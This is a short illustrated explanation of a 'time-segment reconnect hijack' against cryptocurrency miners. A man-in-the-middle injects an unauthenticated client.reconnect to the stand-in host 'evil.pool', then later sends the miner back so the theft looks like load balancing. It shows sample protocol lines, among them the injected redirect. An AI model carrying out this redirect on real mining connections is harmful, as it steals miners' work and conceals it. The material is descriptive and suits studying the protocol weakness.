Time-Segment Reconnect Hijack

Vulnerability: unauthenticated client.reconnect — forced session redirect

1
Normal Monitoring

MITM forwards traffic seamlessly. Miner submits shares to the legitimate pool without issue.

<-- mining.submit("legit_job")

2
Reconnect Injection ATTACK

MITM injects client.reconnect pointing to the malicious pool — no signature, no auth check.

--> client.reconnect("evil.pool", 3333, 0)
3
Malicious Mining

Miner disconnects from the legitimate pool, connects to the evil pool, and unknowingly mines for the attacker.

<-- mining.authorize("attacker_user", ...)
4
Covering Tracks

After time T, the evil pool sends a reconnect back to the legitimate pool. The cycle repeats — indistinguishable from normal load balancing.

The Duty Cycle Attack

By exploiting the unauthenticated client.reconnect, attackers force miners to work for them in short bursts — disguised as routine connection instability rather than theft.
